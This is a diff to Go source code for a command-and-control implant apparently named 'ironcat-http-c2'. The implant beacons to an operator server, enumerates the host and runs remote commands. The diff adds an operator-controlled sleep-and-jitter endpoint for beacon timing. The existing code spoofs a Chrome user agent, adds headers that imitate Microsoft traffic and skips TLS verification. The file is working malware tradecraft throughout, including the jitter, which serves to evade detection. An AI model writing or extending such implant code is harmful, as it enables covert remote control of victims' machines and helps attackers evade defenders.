@@ -7,6 +7,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"math/rand"
 	"net/http"
 	"os"
 	"os/exec"
@@ -20,8 +21,13 @@ var (
 	url              string = ""
 	checkin_endpoint string = "https://" + ip + "/checkin" //added (s)
 	c2_endpoint      string = "https://" + ip + "/cmdctrl" //added (s)
+	sleep_endpoint   string = "https://" + ip + "/sleepctrl"
 	//user_agent       string = "ironcat-http-c2"
 	user_agent string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
+	// Operator-controlled timing values pulled from /sleepctrl in mode 3.
+	pollSleepSeconds     int = 10
+	pollJitterMaxSeconds int = 0
+	rng                      = rand.New(rand.NewSource(time.Now().UnixNano()))
 
 	conf = &tls.Config{
 		InsecureSkipVerify: true,
@@ -46,6 +52,10 @@ var (
 const (
 	requestTimeout = 15 * time.Second
 	commandTimeout = 30 * time.Second
+	minSleepSecs   = 1
+	maxSleepSecs   = 3600
+	minJitterSecs  = 0
+	maxJitterSecs  = 3600
 )
 
 func newRequest(method, endpoint string, body io.Reader) (*http.Request, context.CancelFunc, error) {
@@ -100,7 +110,7 @@ func checkin() string {
 
 }
 
-//enumerate OS without using CMD.exe and return values acorss http c2
+// enumerate OS without using CMD.exe and return values acorss http c2
 func os_enum() {
 
 	hostname, err := os.Hostname()
@@ -269,6 +279,66 @@ func c2() {
 	fmt.Printf(rescn.Status)
 }
 
+func updateSleep() {
+	req, cancel, err := newRequest("GET", sleep_endpoint, nil)
+	if err != nil {
+		fmt.Println("sleepctrl request creation failed:", err)
+		return
+	}
+	defer cancel()
+
+	req.Header.Set("User-Agent", user_agent)
+	req.Header.Add("authority", "www.microsoft.com")
+	req.Header.Add("path", "en-us")
+	req.Header.Add("scheme", "https")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Println("sleepctrl request failed:", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		fmt.Println("sleepctrl unexpected status:", resp.Status)
+		return
+	}
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		fmt.Println("sleepctrl response read failed:", err)
+		return
+	}
+
+	var cfg SleepCfg
+	if err := json.Unmarshal(body, &cfg); err != nil {
+		fmt.Println("invalid sleepctrl payload:", err)
+		return
+	}
+
+	if cfg.SleepSeconds < minSleepSecs || cfg.SleepSeconds > maxSleepSecs {
+		fmt.Printf("sleepctrl value out of range (%d-%d): %d\n", minSleepSecs, maxSleepSecs, cfg.SleepSeconds)
+		return
+	}
+	if cfg.JitterSeconds < minJitterSecs || cfg.JitterSeconds > maxJitterSecs {
+		fmt.Printf("sleepctrl jitter out of range (%d-%d): %d\n", minJitterSecs, maxJitterSecs, cfg.JitterSeconds)
+		return
+	}
+
+	pollSleepSeconds = cfg.SleepSeconds
+	pollJitterMaxSeconds = cfg.JitterSeconds
+	fmt.Printf("updated poll timing: base=%ds jitter_max=%ds\n", pollSleepSeconds, pollJitterMaxSeconds)
+}
+
+// nextPollDelay adds a random jitter in the range [0, jitter_max] each loop.
+func nextPollDelay() time.Duration {
+	jitterAdd := 0
+	if pollJitterMaxSeconds > 0 {
+		jitterAdd = rng.Intn(pollJitterMaxSeconds + 1)
+	}
+	return time.Duration(pollSleepSeconds+jitterAdd) * time.Second
+}
+
 func check(e error) {
 	if e != nil {
 		fmt.Println(e)
@@ -280,22 +350,26 @@ type Cmd struct {
 	Command string `json:"cmd"`
 }
 
+type SleepCfg struct {
+	SleepSeconds  int `json:"sleep_seconds"`
+	JitterSeconds int `json:"jitter_seconds"`
+}
+
 func main() {
 	for 1 == 1 {
 
 		switch checkin() {
 
 		case "0":
-			time.Sleep(10 * time.Second)
 		case "1":
 			os_enum()
-			time.Sleep(10 * time.Second)
 		case "2":
 			c2()
-			time.Sleep(10 * time.Second)
+		case "3":
+			updateSleep()
 		default:
-			time.Sleep(10 * time.Second)
 		}
+		time.Sleep(nextPollDelay())
 
 	}
 }
